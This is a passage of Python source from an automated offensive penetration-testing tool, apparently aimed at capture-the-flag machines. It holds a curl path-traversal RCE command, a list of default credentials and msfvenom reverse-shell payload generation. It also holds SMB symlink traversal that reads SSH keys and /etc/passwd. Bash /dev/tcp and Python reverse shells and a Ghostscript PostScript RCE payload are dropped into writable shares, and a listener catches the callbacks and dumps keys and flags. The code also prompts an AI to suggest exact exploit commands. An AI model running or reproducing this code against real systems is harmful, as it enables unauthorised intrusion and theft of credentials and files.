                    if m.group(1).lower() not in ('http', 'https', 'topic'):
                        loot.add('creds', f"MQTT payload: {m.group(1)}:{m.group(2)}")
            vulns.append({'port': port, 'service': 'mqtt', 'product': 'MQTT broker', 'version': '',
                         'desc': 'MQTT broker allows anonymous subscription (secrets may leak in messages)',
                         'cve': '', 'exploit': f"mosquitto_sub -h {target} -p {port} -t '#' -v",
                         'severity': 'high'})
        else:
            info("  no retained messages captured on first pass")
            _recommend(loot, f"mosquitto_sub -h {target} -p {port} -t '#' -v   # listen longer / publish-probe",
                       "MQTT anonymous subscribe (install mosquitto-clients for live streams)")
    return vulns


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WEB STACK FINGERPRINTING + SOURCE/JS/DIR INTEL + FRAMEWORK EXPLOIT LOOKUP
# ------------------------------------------------------------------------
# Passive tech fingerprint (headers/cookies/error-pages/body), HTML source +
# comment + href harvesting, JavaScript vuln-pattern scan, directory-listing
# abuse, robots/sitemap, and framework->known-exploit/default-login mapping.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# cookie name (lower) -> stack
_COOKIE_STACK = {
    'connect.sid': 'Express/Node.js', 'csrftoken': 'Django', 'sessionid': 'Django',
    'laravel_session': 'Laravel', 'xsrf-token': 'Laravel/Angular', 'phpsessid': 'PHP',
    'jsessionid': 'Java (Tomcat/JSP)', 'asp.net_sessionid': 'ASP.NET', 'ci_session': 'CodeIgniter',
    '_rails_session': 'Ruby on Rails', 'wordpress_logged_in': 'WordPress', 'wp-settings': 'WordPress',
    'flask': 'Flask', 'session': 'Flask/generic', 'ci_csrf_token': 'CodeIgniter',
}
# header (lower) substr -> stack
_HEADER_STACK = {
    'express': 'Express/Node.js', 'next.js': 'Next.js', 'php': 'PHP', 'asp.net': 'ASP.NET',
    'wsgiserver': 'Django (WSGI)', 'werkzeug': 'Flask/Werkzeug', 'gunicorn': 'Python (Gunicorn)',
    'kestrel': 'ASP.NET Core', 'apache': 'Apache', 'nginx': 'nginx', 'iis': 'IIS',
    'tomcat': 'Tomcat', 'jetty': 'Jetty', 'openresty': 'nginx/OpenResty', 'phusion': 'Ruby (Passenger)',
    'drupal': 'Drupal', 'nextjs': 'Next.js',
}
# body/error signature -> stack
_BODY_STACK = [
    (r'Cannot (GET|POST) /', 'Express/Node.js'),
    (r'window\.__next_f', 'Next.js (App Router)'),
    (r'/_next/static/', 'Next.js'),
    (r'wp-content|wp-includes|/wp-json', 'WordPress'),
    (r'Joomla!|/media/jui/|com_content', 'Joomla'),
    (r'Drupal\.settings|/sites/default/files', 'Drupal'),
    (r'csrfmiddlewaretoken', 'Django'),
    (r'Whoops, looks like something went wrong|laravel', 'Laravel'),
    (r'Werkzeug|Traceback \(most recent call last\)', 'Flask/Werkzeug (debug)'),
    (r'data-reactroot|react(?:-dom)?\.production', 'React'),
    (r'ng-version=', 'Angular'),
    (r'X-Grafana|grafana', 'Grafana'),
]
# framework/product -> [(user, pass)] default creds
_FRAMEWORK_DEFAULT_CREDS = {
    'tomcat': [('tomcat', 'tomcat'), ('admin', 'admin'), ('tomcat', 's3cret')],
    'jenkins': [('admin', 'admin')], 'wordpress': [('admin', 'admin'), ('admin', 'password')],
    'grafana': [('admin', 'admin')], 'joomla': [('admin', 'admin')],
    'gitlab': [('root', '5iveL!fe')], 'zabbix': [('Admin', 'zabbix')],
    'phpmyadmin': [('root', ''), ('root', 'root')], 'jboss': [('admin', 'admin')],
    'rabbitmq': [('guest', 'guest')], 'openfire': [('admin', 'admin')],
}
# version-keyed known criticals (substring match on "product/version")
_KNOWN_CVES = [
    ('apache/2.4.49', 'CVE-2021-41773 path-traversal->RCE:  curl --path-as-is "URL/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data "echo;id"'),
    ('apache/2.4.50', 'CVE-2021-42013 (double-encoded traversal): %%32%65 bypass'),
    ('next.js', 'CVE-2025-29927 middleware auth bypass: header  x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'),
    ('werkzeug', 'Flask debug console RCE if /console PIN weak (Werkzeug debugger)'),
    ('gitlab', 'check GitLab version vs CVE-2021-22205 (unauth RCE via ExifTool)'),
    ('tomcat', 'try /manager/html default creds; CVE-2020-1938 Ghostcat (AJP 8009); WAR deploy RCE'),
    ('drupal', 'Drupalgeddon2 CVE-2018-7600 / CVE-2019-6340 (check version)'),
    ('phpmyadmin', 'check version for CVE-2018-12613 (LFI->RCE)'),
    ('wordpress', 'wpscan --enumerate vp,u; check plugin CVEs'),
]
# JS source vuln patterns -> description
# NOTE: these are DETECTION regexes searched against target JS source (never executed here).
_JS_VULN_PATTERNS = [
    (r'function\s+\w*merge\w*\([^)]*\)[^{]*\{[^}]*for\s*\(', 'recursive merge() — prototype-pollution candidate'),
    (r'__proto__|constructor\s*\[\s*["\']prototype', 'prototype access — pollution sink'),
    (r'\beval\s*\(', 'eval() — code-exec sink'),
    (r'\.innerHTML\s*=|document\.write\s*\(', 'DOM XSS sink (innerHTML/document.write)'),
    (r'dangerouslySetInnerHTML', 'React dangerouslySetInnerHTML — XSS sink'),
    (r'child_process|require\(["\']child_process', 'child_process — command-exec (SSR)'),
    (r'(api[_-]?key|apikey|secret|token|password|passwd)\s*[:=]\s*["\'][^"\']{6,}', 'hardcoded secret in JS'),
    (r'(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_\-]{35}|sk-[A-Za-z0-9]{20,})', 'cloud/API key in JS'),
]


def fingerprint_stack(url, port, outdir, loot=None):
    """Passive web-stack fingerprint from headers, cookies, error page, and body.
    Returns {'stack','product','version','signals'}. Uses wappalyzer if installed."""
    fp = {'stack': set(), 'product': '', 'version': '', 'signals': []}
    if not shutil.which('curl'):
        return fp
    _, head, _ = _run(['curl', '-sikL', '--max-time', '10', url], timeout=15)
    _, body, _ = _run(['curl', '-skL', '--max-time', '10', url], timeout=15)
    _, err404, _ = _run(['curl', '-skL', '--max-time', '8', url.rstrip('/') + '/nonexistent_' + str(port)], timeout=12)
    hl = head.lower()
    # Server / X-Powered-By version
    m = re.search(r'(?im)^server:\s*(.+)$', head)
    if m:
        fp['signals'].append(f"Server: {m.group(1).strip()}")
        pm = re.search(r'([A-Za-z][\w.-]*?)/(\d[\w.]*)', m.group(1))
        if pm:
            fp['product'], fp['version'] = pm.group(1), pm.group(2)
    xp = re.search(r'(?im)^x-powered-by:\s*(.+)$', head)
    if xp:
        fp['signals'].append(f"X-Powered-By: {xp.group(1).strip()}")
    for sig, stack in _HEADER_STACK.items():
        if sig in hl:
            fp['stack'].add(stack)
    for ck, stack in _COOKIE_STACK.items():
        if re.search(r'(?im)^set-cookie:\s*' + re.escape(ck), head):
            fp['stack'].add(stack)
            fp['signals'].append(f"cookie {ck} -> {stack}")
    for pat, stack in _BODY_STACK:
        if re.search(pat, body + err404, re.I):
            fp['stack'].add(stack)
    # meta generator version (WordPress 6.1 etc.)
    gm = re.search(r'(?i)<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', body)
    if gm:
        fp['signals'].append(f"generator: {gm.group(1)}")
        if not fp['product']:
            gp = re.search(r'([A-Za-z][\w ]*?)\s*([\d.]+)?$', gm.group(1).strip())
            if gp:
                fp['product'] = gp.group(1).strip()
                fp['version'] = (gp.group(2) or '').strip()
    # wappalyzer (npm) if present
    if shutil.which('wappalyzer'):
        _, wout, _ = _run(['wappalyzer', url], timeout=60)
        for m2 in re.finditer(r'"name"\s*:\s*"([^"]+)"', wout):
            fp['stack'].add(m2.group(1))
    if loot and fp['stack']:
        loot.add('notes', f"web stack {url}: {', '.join(sorted(fp['stack']))}"
                 + (f" | {fp['product']} {fp['version']}" if fp['product'] else ''))
    if fp['stack'] or fp['product']:
        good(f"stack {url}: {', '.join(sorted(fp['stack'])) or fp['product']} "
             f"{fp['version']}".strip())
    (outdir / f'fingerprint_{port}.txt').write_text(
        f"stack: {sorted(fp['stack'])}\nproduct: {fp['product']} {fp['version']}\n"
        + '\n'.join(fp['signals']))
    return fp


def harvest_page_intel(url, port, outdir, loot=None):
    """Fetch a page and mine HTML comments, hrefs/src links, JS files, flags,
    emails, and 'note/TODO/password'-style leaks from the source."""
    js_urls, links = set(), set()
    if not shutil.which('curl'):
        return js_urls, links
    _, body, _ = _run(['curl', '-skL', '--max-time', '10', url], timeout=15)
    if not body:
        return js_urls, links
    from urllib.parse import urljoin
    # HTML comments (often hold creds, TODOs, hidden endpoints, flags)
    for c in re.findall(r'<!--(.*?)-->', body, re.S):
        c = c.strip()
        if c and loot and any(k in c.lower() for k in
                              ('todo', 'fixme', 'pass', 'user', 'admin', 'key', 'secret', 'note',
                               'flag', 'http', 'api', 'debug', 'cred', 'login', 'hidden', 'dev')):
            loot.add('notes', f"HTML comment @{url}: {c[:160]}")
            good(f"  comment: {c[:120]}")
    # links + scripts
    for m in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']', body, re.I):
        u = m.group(1)
        full = urljoin(url + '/', u)
        if u.endswith('.js') or '.js?' in u:
            js_urls.add(full)
        elif full.startswith('http') and 'logout' not in full.lower():
            links.add(full)
    # flags / emails / creds in source
    for pat, cat in ((r'(?:HTB|THM|FLAG|flag)\{[^}]+\}', 'flags'),
                     (r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}', 'usernames')):
        for v in set(re.findall(pat, body))[:20]:
            if loot:
                loot.add(cat, v)
    if loot:
        loot.scan_output(body[:40000])
        for l in sorted(links)[:60]:
            loot.add('urls', l)
    if js_urls:
        (outdir / f'js_files_{port}.txt').write_text('\n'.join(sorted(js_urls)))
    return js_urls, links


def analyze_js(js_urls, outdir, args, loot=None):
    """Fetch referenced JS files and scan for endpoints, secrets, and known
    client-side vuln patterns (prototype pollution, eval, DOM-XSS sinks)."""
    vulns = []
    if not shutil.which('curl'):
        return vulns
    endpoints = set()
    for ju in sorted(js_urls)[:30]:
        _, js, _ = _run(['curl', '-skL', '--max-time', '10', ju], timeout=15)
        if not js:
            continue
        for ep in re.findall(r'["\'](/[A-Za-z0-9_./-]{2,}(?:\?[^"\']*)?)["\']', js):
            if any(x in ep for x in ('/api', '/admin', '/user', '/login', '/upload', '/graphql', '/v1', '/v2')):
                endpoints.add(ep)
        for pat, desc in _JS_VULN_PATTERNS:
            m = re.search(pat, js, re.I)
            if m:
                good(f"  JS pattern in {ju.split('/')[-1]}: {desc}")
                if loot:
                    loot.add('auth_findings', f"JS ({ju.split('/')[-1]}): {desc} -> {m.group(0)[:80]}")
                sev = 'high' if any(k in desc for k in ('secret', 'key', 'pollution', 'command')) else 'medium'
                vulns.append({'port': 0, 'service': 'http', 'product': 'web app', 'version': '',
                             'desc': f'Client-side {desc} in {ju.split("/")[-1]}', 'cve': '',
                             'exploit': f'inspect {ju}', 'severity': sev})
    if endpoints:
        (outdir / 'js_endpoints.txt').write_text('\n'.join(sorted(endpoints)))
        good(f"  JS revealed {len(endpoints)} API endpoints")
        if loot:
            for e in sorted(endpoints)[:40]:
                loot.add('urls', f'[js-endpoint] {e}')
    return vulns


def check_dir_listing(base_url, port, extra_dirs, outdir, loot=None):
    """Detect open directory listings (Index of /) + .git exposure on discovered
    and common dirs; enumerate and scan listed files for secrets/flags."""
    vulns = []
    if not shutil.which('curl'):
        return vulns
    from urllib.parse import urljoin
    # Dynamic: dirs come from gobuster + crawler discovery. Only VCS-exposure paths
    # are always-checked (a specific security test, not a content guess).
    dirs = list(dict.fromkeys(list(extra_dirs) + ['.git', '.svn', '.hg']))
    for d in dirs[:60]:
        u = urljoin(base_url.rstrip('/') + '/', d.strip('/') + '/')
        _, body, _ = _run(['curl', '-skL', '--max-time', '8', u], timeout=12)
        if re.search(r'Index of /|<title>Directory listing for|autoindex', body, re.I):
            good(f"  OPEN DIR LISTING: {u}")
            files = re.findall(r'href=["\']([^"\'?/][^"\']*)["\']', body)
            if loot:
                loot.add('auth_findings', f"open directory listing: {u} ({len(files)} entries)")
                loot.add_step(f"Web: browse open dir {u} for secrets/backups")
            vulns.append({'port': port, 'service': 'http', 'product': 'web app', 'version': '',
                         'desc': f'Open directory listing at {u}', 'cve': '',
                         'exploit': f'wget -r {u}', 'severity': 'medium'})
            # pull small interesting files and scan them
            for f in files[:25]:
                if re.search(r'\.(txt|bak|old|conf|config|cfg|ini|env|yml|yaml|json|sql|log|php~|swp|key|pem|zip|tar|gz)$', f, re.I):
                    fu = urljoin(u, f)
                    _, fb, _ = _run(['curl', '-skL', '--max-time', '8', fu], timeout=12)
                    if fb and loot:
                        loot.add('files', fu)
                        loot.scan_output(fb[:20000])
        # .git exposure
        if d == '.git':
            _, gh, _ = _run(['curl', '-skL', '--max-time', '8', urljoin(base_url + '/', '.git/HEAD')], timeout=12)
            if 'ref:' in gh:
                good(f"  .git EXPOSED: {base_url}/.git/  (dump with git-dumper)")
                if loot:
                    loot.add('auth_findings', f".git repo exposed at {base_url}/.git/")
                    loot.add('recommend', f"git-dumper {base_url}/.git/ ./gitdump   # recover source + secrets")
                vulns.append({'port': port, 'service': 'http', 'product': 'git', 'version': '',
                             'desc': f'Exposed .git repository at {base_url}/.git/', 'cve': '',
                             'exploit': f'git-dumper {base_url}/.git/ out', 'severity': 'high'})
    return vulns


def fetch_robots_sitemap(base_url, outdir, loot=None):
    """Parse robots.txt + sitemap.xml for hidden paths -> corpus."""
    paths = set()
    if not shutil.which('curl'):
        return paths
    for res in ('robots.txt', 'sitemap.xml', '.well-known/security.txt'):
        _, body, _ = _run(['curl', '-skL', '--max-time', '8', base_url.rstrip('/') + '/' + res], timeout=12)
        if not body or '<html' in body[:200].lower():
            continue
        (outdir / res.replace('/', '_')).write_text(body[:20000])
        for m in re.finditer(r'(?im)^(?:Disallow|Allow):\s*(\S+)', body):
            paths.add(m.group(1))
        for m in re.finditer(r'<loc>([^<]+)</loc>', body):
            paths.add(m.group(1))
        if paths and loot:
            loot.add('notes', f"{res}: {len(paths)} paths")
            for p in sorted(paths)[:40]:
                loot.add('urls', f'[{res}] {p}')
    return paths


def framework_exploit_lookup(fp, url, outdir, args, loot=None):
    """Map an identified stack/version to known exploits, default logins, and a
    searchsploit lookup — the 'now that I know the framework, what breaks it' step."""
    vulns = []
    prodver = f"{fp.get('product', '')}/{fp.get('version', '')}".lower()
    stacks = ' '.join(fp.get('stack', [])).lower() + ' ' + prodver
    # known-CVE map
    for key, note in _KNOWN_CVES:
        if key in prodver or key in stacks:
            good(f"  known-exploit: {note}")
            if loot:
                loot.add('recommend', f"[exploit] {url}: {note}")
            vulns.append({'port': 0, 'service': 'http', 'product': fp.get('product', 'web'),
                         'version': fp.get('version', ''), 'desc': f'Known-vulnerable stack: {note.split(":")[0]}',
                         'cve': (re.search(r'CVE-\d{4}-\d+', note) or [''])[0] if re.search(r'CVE-\d{4}-\d+', note) else '',
                         'exploit': note, 'severity': 'high'})
    # default logins
    for fw, creds in _FRAMEWORK_DEFAULT_CREDS.items():
        if fw in stacks:
            cred_str = ', '.join(f"{u}:{p or '<blank>'}" for u, p in creds)
            if loot:
                loot.add('recommend', f"[default-login] {url} ({fw}): try {cred_str}")
            good(f"  default logins for {fw}: {cred_str}")
    # searchsploit on product+version
    if shutil.which('searchsploit') and fp.get('product'):
        q = f"{fp['product']} {fp.get('version', '')}".strip()
        _, out, _ = _run(['searchsploit', '--color', '-w'] + q.split(), timeout=30)
        hits = [l for l in out.splitlines() if 'exploit-db' in l.lower() or 'http' in l.lower()]
        if hits:
            (outdir / 'framework_searchsploit.txt').write_text(out)
            good(f"  searchsploit '{q}': {len(hits)} results")
            if loot:
                loot.add('recommend', f"[searchsploit] {q}: {len(hits)} exploit(s) — see framework_searchsploit.txt")
    return vulns


# ── msfvenom payload generation (AI-assisted format + obfuscation) ─────────
def run_msfvenom(target_os, arch, lhost, lport, outdir, args, loot=None, fp=None):
    """Generate a reverse-shell payload with msfvenom, picking format/encoder from
    the detected OS/stack. Obfuscation via shikata_ga_nai + iterations. Payload is
    written to disk and its handler/usage recorded — only when --lhost is given."""
    if not shutil.which('msfvenom') or not lhost:
        if not shutil.which('msfvenom') and loot:
            loot.add('recommend', "install metasploit for msfvenom payloads")
        return
    os_l = (target_os or '').lower()
    stack = ' '.join((fp or {}).get('stack', [])).lower()
    # pick payload + format by OS/stack
    if 'windows' in os_l:
        payload, fmt, ext = 'windows/x64/meterpreter/reverse_tcp', 'exe', 'exe'
    elif 'php' in stack:
        payload, fmt, ext = 'php/reverse_php', 'raw', 'php'
    elif 'java' in stack or 'tomcat' in stack:
        payload, fmt, ext = 'java/jsp_shell_reverse_tcp', 'raw', 'jsp'
    else:
        payload, fmt, ext = 'linux/x64/meterpreter/reverse_tcp', 'elf', 'elf'
    outfile = outdir / f'payload_{lport}.{ext}'
    cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', fmt,
           '-o', str(outfile)]
    if ext in ('exe', 'elf'):
        cmd += ['-e', 'x64/xor_dynamic', '-i', '5']   # light obfuscation/encoding
    subsection("msfvenom Payload Generation")
    info(f"msfvenom {payload} -> {outfile.name}")
    _run(cmd, timeout=120)
    if outfile.exists() and loot:
        loot.add('files', f'payload: {outfile}')
        loot.add('recommend', f"# handler: msfconsole -qx 'use exploit/multi/handler; "
                 f"set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'")
        loot.add('recommend', f"# deliver {outfile.name} then execute on target")
        good(f"  payload written: {outfile}")


def ai_block_report(target, services, vulns, loot, args, outdir):
    """When the pipeline did not obtain a foothold/credential, summarise the exact
    blockers and (via AI when available) the suggested manual next steps — so the
    operator knows precisely what to do by hand. The user's explicit ask."""
    got_cred = bool(getattr(loot, 'valid_creds', []))
    got_foothold = any(v.get('severity') in ('critical', 'high') for v in vulns)
    if got_cred:
        return
    subsection("Blockers & Suggested Manual Path")
    blockers = []
    if not got_cred:
        blockers.append("No valid credential obtained (AS-REP/spray/brute/reuse exhausted or gated).")
    if not got_foothold:
        blockers.append("No confirmed high/critical foothold — likely needs manual web/logic exploitation.")
    open_web = [p for p, s in services.items() if 'http' in s.get('service', '').lower()]
    if open_web:
        blockers.append(f"Web services on {open_web}: check the fingerprint/JS/dir-listing findings for a manual path.")
    for b in blockers:
        print(f"    {C.Y}[BLOCKED]{C.Re} {b}")
        loot.add('recommend', f"[BLOCKED] {b}")
    # AI-suggested path from everything gathered
    api_key = getattr(args, 'api_key', '') or None
    if api_key:
        ctx = {
            'target': target,
            'services': {str(k): v.get('service', '') for k, v in services.items()},
            'findings': [v.get('desc', '') for v in vulns][:40],
            'stack_notes': [n for n in getattr(loot, 'notes', []) if 'web stack' in n or 'comment' in n][:20],
            'auth_findings': getattr(loot, 'auth_findings', [])[:20],
            'usernames': list(dict.fromkeys(getattr(loot, 'usernames', [])))[:30],
        }
        prompt = ("You are an expert pentester. Based ONLY on this recon data, state the single most "
                  "likely foothold and the EXACT manual commands to try next. Be concrete and terse. "
                  "If a web framework/version is identified, name the specific exploit/CVE or default login.\n\n"
                  + json.dumps(ctx, indent=1, default=str))
        ans = query_ai(prompt, api_key=api_key, timeout=90)
        if ans:
            print(f"\n{C.M}{C.Bo}  AI — SUGGESTED MANUAL PATH:{C.Re}")
            print(ans)
            (outdir / 'BLOCKERS_AND_NEXT_STEPS.md').write_text(
                f"# Blockers & Suggested Manual Path — {target}\n\n"
                + '\n'.join(f"- {b}" for b in blockers) + "\n\n## AI-suggested next steps\n\n" + ans)
            if loot:
                loot.add('notes', 'AI suggested manual path -> BLOCKERS_AND_NEXT_STEPS.md')


def run_smb_symlink_traversal(target, services, outdir, args, tools, loot=None, context=None):
    """Samba writable-share symlink directory traversal: plant a symlink to '/'
    inside a writable share and read arbitrary files (SSH keys, flags, /etc/passwd,
    web roots, smb.conf) when the server allows 'wide links'/'follow symlinks'.
    A general, high-impact SMB capability. Active-gated (it writes a symlink)."""
    vulns = []
    svc = {p: s.get('service', '').lower() for p, s in services.items()}
    has_smb = (445 in services or 139 in services
               or any('smb' in v or 'netbios' in v or 'microsoft-ds' in v for v in svc.values()))
    if not has_smb or not shutil.which('smbclient'):
        return vulns
    context = context if context is not None else {}
    if not active_enabled(args):
        _recommend(loot, f"smbclient //{target}/<writable_share> -N -c 'symlink / x'; then "
                   f"get x/etc/passwd , x/home/*/.ssh/id_rsa , x/root/root.txt",
                   "Samba symlink traversal (arbitrary file read via writable share)")
        return vulns

    # discover shares (reuse context, else list)
    shares = list(context.get('smb_shares') or [])
    if not shares:
        _, ls, _ = _run(['smbclient', '-N', '-L', f'//{target}/'], timeout=60)
        shares = re.findall(r'^\s*(\S+)\s+Disk', ls, re.M)
    shares = [s for s in shares if s.upper() not in ('IPC$', 'PRINT$', 'ADMIN$', 'C$')]
    if not shares:
        return vulns

    subsection("SMB Symlink Directory Traversal")
    loot_dir = outdir / 'smb_symlink_loot'
    loot_dir.mkdir(exist_ok=True)
    high_value = ['etc/passwd', 'home/scott/user.txt', 'root/root.txt',
                  'home/scott/.ssh/id_rsa', 'root/.ssh/id_rsa', 'etc/samba/smb.conf',
                  'home/scott/.bash_history', 'var/www/html/config.php']

    for sh in shares:
        link = 'lk%d' % (int(time.time()) % 100000)
        # plant a symlink to filesystem root inside the writable share
        _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'symlink / {link}'], timeout=30)
        # test traversal by reading /etc/passwd through the symlink
        pf = loot_dir / f'passwd_via_{sh}'
        _run(['smbclient', f'//{target}/{sh}', '-N', '-c',
             f'get {link}/etc/passwd {pf}'], timeout=30)
        if not (pf.exists() and 'root:' in pf.read_text(errors='ignore')):
            # some servers need the link relative or the share root itself; try '.'
            continue
        good(f"  SYMLINK TRAVERSAL works on //{target}/{sh} — arbitrary filesystem read")
        if loot:
            loot.add('auth_findings', f"Samba symlink traversal via writable share '{sh}' -> arbitrary file read")
            loot.add_step(f"SMB: symlink traversal on {sh} -> read SSH keys / flags / configs")
        vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
                     'desc': f'Samba symlink directory traversal via writable share "{sh}" (arbitrary file read as the Samba user)',
                     'cve': '', 'exploit': f"smbclient //{target}/{sh} -N -c 'symlink / x; get x/root/root.txt'",
                     'severity': 'critical'})
        # discover real users from /etc/passwd, then pull each user's flag + SSH key
        passwd = pf.read_text(errors='ignore')
        users = [m.group(1) for m in re.finditer(r'^([a-z_][a-z0-9_-]*):x:\d{4,}:', passwd, re.M)]
        for u in users:
            high_value += [f'home/{u}/user.txt', f'home/{u}/.ssh/id_rsa',
                           f'home/{u}/.bash_history', f'home/{u}/local.txt']
        for tgt in dict.fromkeys(high_value):
            dest = loot_dir / tgt.replace('/', '_')
            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'get {link}/{tgt} {dest}'], timeout=25)
            if dest.exists() and dest.stat().st_size:
                txt = dest.read_text(errors='ignore')
                if not txt.strip():
                    continue
                good(f"    read {tgt}: {txt.strip()[:80]}")
                if loot:
                    loot.add('files', f'symlink://{sh}/{tgt} -> {dest}')
                    loot.scan_output(txt)
                    if tgt.endswith(('user.txt', 'root.txt', 'local.txt')) and re.fullmatch(r'[0-9a-f]{32}\s*', txt.strip() + ' '):
                        loot.add('flags', f"{tgt} = {txt.strip()}")
                    elif tgt.endswith(('user.txt', 'root.txt', 'local.txt')):
                        loot.add('flags', f"{tgt} = {txt.strip()[:64]}")
                    if 'PRIVATE KEY' in txt:
                        keyf = loot_dir / (tgt.replace('/', '_'))
                        loot.add('keys', f'SSH private key {tgt} -> {keyf} (chmod 600; ssh -i)')
                        loot.add_step(f"Foothold: SSH private key for {tgt.split('/')[1]} captured -> ssh -i")
        break
    return vulns


def run_writable_share_payload(target, services, outdir, args, tools, loot=None, context=None):
    """Drop reverse-shell payloads into writable SMB shares (for boxes where a cron
    or 'print/processing' job auto-executes dropped files), catch the callback on
    --lhost/--lport, and auto-loot flags (id, user.txt, root.txt, SSH keys).
    Active-gated; requires --lhost. General capability for writable-share RCE."""
    vulns = []
    context = context if context is not None else {}
    writ = context.get('writable_shares') or []
    lhost = getattr(args, 'lhost', None)
    lport = int(getattr(args, 'lport', None) or 4444)
    if not (active_enabled(args) and shutil.which('smbclient') and writ):
        return vulns
    if not lhost:
        _recommend(loot, "re-run with --lhost <tun0-ip> --lport <port> to drop a reverse shell into "
                   "the writable share and catch the callback if a job auto-runs it")
        return vulns

    import socket
    import threading
    subsection("Writable-Share Payload Drop + Catch")
    wait_s = int(getattr(args, 'catch_wait', None) or 280)   # cover slow cron intervals
    caught = {'shell': False, 'out': ''}
    loot_cmd = ('id; hostname; echo "==USERTXT=="; cat /home/*/user.txt 2>/dev/null; '
                'echo "==ROOTTXT=="; cat /root/root.txt 2>/dev/null; '
                'echo "==KEYS=="; cat /home/*/.ssh/id_rsa 2>/dev/null; '
                'echo "==HOMES=="; ls -la /home 2>/dev/null; '
                'echo "==SUDO=="; sudo -n -l 2>/dev/null\n')

    def _listener():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', lport))
            s.listen(1)
            s.settimeout(wait_s)
            conn, addr = s.accept()
            caught['shell'] = True
            good(f"  REVERSE SHELL from {addr[0]} !")
            try:
                conn.sendall(loot_cmd.encode())
            except Exception:
                pass
            conn.settimeout(8)
            data, t0 = b'', time.time()
            while time.time() - t0 < 14:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                except Exception:
                    break
            caught['out'] = data.decode('utf-8', 'ignore')
            try:
                conn.close()
                s.close()
            except Exception:
                pass
        except Exception as e:
            caught['out'] = f'listener error: {e}'

    th = threading.Thread(target=_listener, daemon=True)
    th.start()
    time.sleep(1)

    pdir = outdir / 'share_payloads'
    pdir.mkdir(exist_ok=True)
    revcmd = f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'
    # (a) direct scripts (cron that runs *.sh/*.py)
    (pdir / 'p.sh').write_text(f'#!/bin/bash\n{revcmd}\n')
    (pdir / 'p.py').write_text(
        'import socket,subprocess,os\n'
        f's=socket.socket();s.connect(("{lhost}",{lport}))\n'
        'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n'
        'subprocess.call(["/bin/sh","-i"])\n')
    # (b) GhostScript RCE PostScript (CVE-2018-16509 %pipe%) — for print/PDF processors
    for psname in ('p.ps', 'p.eps'):
        (pdir / psname).write_text(
            "%!PS\n"
            "userdict /setpagedevice undef\n"
            "save\n"
            "legal\n"
            "{ null restore } stopped { pop } if\n"
            "{ legal } stopped { pop } if\n"
            "restore\n"
            f"mark /OutputFile (%pipe%{revcmd}) currentdevice putdeviceprops\n")
    # (c) ImageMagick MVG/SVG delegate RCE (ImageTragick) — for image processors
    (pdir / 'p.svg').write_text(
        '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">\n'
        f'<image xlink:href="msl:/tmp/x.msl" height="100" width="100"/>\n</svg>\n')
    # names span the likely processors; extension usually decides how the job handles it
    drops = {'shell.sh': 'p.sh', 'job.sh': 'p.sh', 'print.sh': 'p.sh', 'run.py': 'p.py',
             'job.ps': 'p.ps', 'print.ps': 'p.ps', 'document.ps': 'p.ps', 'scan.eps': 'p.eps',
             'reception.ps': 'p.ps', 'invoice.ps': 'p.ps', 'image.svg': 'p.svg'}
    dropped_names = list(drops)
    for sh in writ:
        info(f"dropping reverse-shell payloads into //{target}/{sh} ({len(drops)} names/types)")
        for n, srcf in drops.items():
            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'put {pdir / srcf} {n}'], timeout=20)
        if loot:
            loot.add_step(f"SMB: dropped reverse-shell payloads into writable share {sh}")

    # Dynamic auto-processing detection: poll whether the dropped files get consumed
    consumed = False
    info(f"waiting up to {wait_s}s for a callback on {lhost}:{lport} (polling share for auto-processing)...")
    poll_share = writ[0] if writ else None
    t0 = time.time()
    while time.time() - t0 < wait_s and not caught['shell']:
        time.sleep(15)
        if poll_share and not consumed:
            _, lsout, _ = _run(['smbclient', f'//{target}/{poll_share}', '-N', '-c', 'ls'], timeout=20)
            present = sum(1 for n in dropped_names if n in lsout)
            if present < len(dropped_names):
                consumed = True
                good(f"  dropped files are being CONSUMED from {poll_share} "
                     f"({len(dropped_names) - present}/{len(dropped_names)} gone) — auto-processing confirmed")
                if loot:
                    loot.add_step(f"SMB: writable share {poll_share} auto-processes dropped files")
    th.join(timeout=5)
    (outdir / 'reverse_shell_output.txt').write_text(caught['out'])
    if caught['shell']:
        good("  FOOTHOLD: reverse shell caught via writable share")
        out = caught['out']
        print(out[:2000])
        if loot:
            loot.scan_output(out)
            for tag, cat in (('==USERTXT==', 'flags'), ('==ROOTTXT==', 'flags'), ('==KEYS==', 'keys')):
                if tag in out:
                    seg = out.split(tag, 1)[1].split('==', 1)[0].strip()
                    if seg:
                        loot.add(cat, f"{tag} {seg[:300]}")
            loot.add_step("Foothold shell caught -> looted id/user.txt/root.txt/keys/sudo")
        vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
                     'desc': 'RCE via auto-processed writable SMB share (reverse shell caught)',
                     'cve': '', 'exploit': f'drop bash revshell in writable share; listener on {lport}',
                     'severity': 'critical'})
    elif consumed:
        good("  files are auto-processed but no shell yet — the processor expects a specific filetype")
        if loot:
            loot.add('auth_findings', f"writable share auto-processes dropped files (consumed) — "
                     f"craft the expected filetype (print job/.ps/.pjl/document/macro) for RCE")
